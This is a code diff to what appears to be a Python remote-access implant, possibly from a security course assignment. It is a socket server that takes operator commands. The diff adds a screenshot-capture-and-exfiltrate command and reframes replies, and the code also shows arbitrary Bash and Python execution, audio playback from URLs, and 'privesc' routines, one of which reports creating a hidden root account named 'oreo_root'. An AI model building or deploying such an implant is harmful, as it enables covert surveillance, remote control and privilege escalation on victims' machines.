@@ -77,7 +77,21 @@ def play_audio_from_url(url):
     )
     os.unlink(path)
 
+# screenshot 
 
+def screenshot():
+    import time
+    import subprocess
+    import os
+
+    filename = f"/tmp/screenshot_{int(time.time())}.png"
+    result = subprocess.run(["gnome-screenshot", "-f", filename], capture_output=True, text=True)
+    if result.returncode != 0:
+        raise RuntimeError(f"gnome-screenshot failed: {result.stderr}")
+    if not os.path.exists(filename):
+        raise RuntimeError("Screenshot file was not created")
+    return filename
+    
 def run_command(cmd, shell=True, capture_output=True, **kwargs):
     return subprocess.run(
         cmd,
@@ -213,30 +227,36 @@ def handle_conn(conn, addr):
                 try:
                     url = command_body.strip()
                     play_audio_from_url(url)
-                    send_framed(conn, b"Playing Audio")
+                    send_framed(conn, b"TEXT\n" + b"Playing Audio")
                 except Exception as e:
-                    send_framed(conn, f"Audio error: {e}".encode())
-            elif command_type =="click":
-                photo_bytes = take_photo()
-                send_framed(conn, photo_bytes)
+                    send_framed(conn, b"TEXT\n" + f"Audio error: {e}".encode())
+            elif command_type == "CLICK":
+                try:
+                    path = screenshot()
+                    with open(path, "rb") as f:
+                        data = f.read()
+                    send_framed(conn, b"FILE\n" + data)
+                except Exception as e:
+                    print(f"Screenshot error: {e}")
+                    send_framed(conn, b"TEXT\n" + f"Screenshot error: {e}".encode())
             elif command_type == "privesc":
                 print("Running privesc")
                 privesc()
                 # conn.sendall(b"Privesc triggered: restarting as root")
-                send_framed(conn, b"Privesc triggered: restarting as root")
+                send_framed(conn, b"TEXT\n" + b"Privesc triggered: restarting as root")
             elif command_type == "privesc2":
                 print("Running privesc2")
                 success = privesc2()
                 if success:
-                    send_framed(conn, b"[+] Privesc2 successful! Account 'oreo_root' created.")
+                    send_framed(conn, b"TEXT\n" + b"[+] Privesc2 successful! Account 'oreo_root' created.")
                 else:
-                    send_framed(conn, b"[-] Privesc2 failed: check server logs.")
+                    send_framed(conn, b"TEXT\n" + b"[-] Privesc2 failed: check server logs.")
             #Command 2: Python 
             elif command_type == "PY":
                 print("Running python")
                 result = handle_python_command(command_body)
                 # conn.sendall(result.encode("utf-8", errors="replace"))
-                send_framed(conn, result.encode("utf-8", errors="replace"))
+                send_framed(conn, b"TEXT\n" + result.encode("utf-8", errors="replace"))
             
             elif command_type == "BASH":
                 print(f"Running bash: {command_body}")
@@ -256,10 +276,10 @@ def handle_conn(conn, addr):
                 )
                 
                 output = proc.stdout + proc.stderr
-                send_framed(conn, output if output else b"[no output]")
+                send_framed(conn, b"TEXT\n" + (output if output else b"[no output]"))
             else: 
                 # conn.sendall(f"Unknown command: {command_type}".encode())
-                send_framed(conn, f"Unknown command: {command_type}".encode())
+                send_framed(conn, b"TEXT\n" + f"Unknown command: {command_type}".encode())
         # Think VERY carefully about how you will communicate between the client and server
         # You will need to make a custom protocol to transfer commands
         # try:
@@ -267,7 +287,7 @@ def handle_conn(conn, addr):
             # Process the communication data from 
         except Exception as e:
             # conn.sendall(f"error: {e}".encode())
-            send_framed(conn, f"error: {e}".encode())
+            send_framed(conn, b"TEXT\n" + f"error: {e}".encode())
 
 def main():
     kill_others()
